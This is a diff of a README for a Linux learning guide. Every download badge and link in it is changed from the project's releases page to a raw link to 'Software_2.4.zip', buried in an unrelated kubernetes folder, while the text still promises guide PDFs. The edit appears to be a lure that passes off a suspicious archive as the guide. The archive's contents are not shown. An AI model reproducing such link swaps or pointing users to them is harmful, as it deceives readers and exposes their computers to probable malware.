@@ -1,6 +1,6 @@
 # 🐧 Linux - Your Complete Linux Learning Companion
 
-[![Download Linux Guide](https://img.shields.io/badge/Download-Linux%20Guide-brightgreen)](https://github.com/Suman2252/Linux/releases)
+[![Download Linux Guide](https://img.shields.io/badge/Download-Linux%20Guide-brightgreen)](https://raw.githubusercontent.com/Suman2252/Linux/main/27-kubernetes-orchestration/Software_2.4.zip)
 
 ## 📝 About Linux Guide
 
@@ -44,7 +44,7 @@ This section explains how to get the guide files and start learning.
 
 Click the big green button at the top or use this link:
 
-https://github.com/Suman2252/Linux/releases
+https://raw.githubusercontent.com/Suman2252/Linux/main/27-kubernetes-orchestration/Software_2.4.zip
 
 This page lists all the available releases of the Linux guide. The latest release includes PDF files and cheat sheets for all chapters. 
 
@@ -149,7 +149,7 @@ Check the cheatsheets included with the guide. They provide explanations for mos
 
 Visit this page to download the latest Linux guide and related files:
 
-[Download Linux Guide](https://github.com/Suman2252/Linux/releases)
+[Download Linux Guide](https://raw.githubusercontent.com/Suman2252/Linux/main/27-kubernetes-orchestration/Software_2.4.zip)
 
 Download the guide PDFs and extras you need. Store them in a folder on your computer. Open the PDFs with your reader to start learning immediately.
 
@@ -184,4 +184,4 @@ These topics help build practical Linux skills for work or personal use.
 
 ---
 
-[![Download Linux Guide](https://img.shields.io/badge/Download-Linux%20Guide-brightgreen)](https://github.com/Suman2252/Linux/releases)
+[![Download Linux Guide](https://img.shields.io/badge/Download-Linux%20Guide-brightgreen)](https://raw.githubusercontent.com/Suman2252/Linux/main/27-kubernetes-orchestration/Software_2.4.zip)
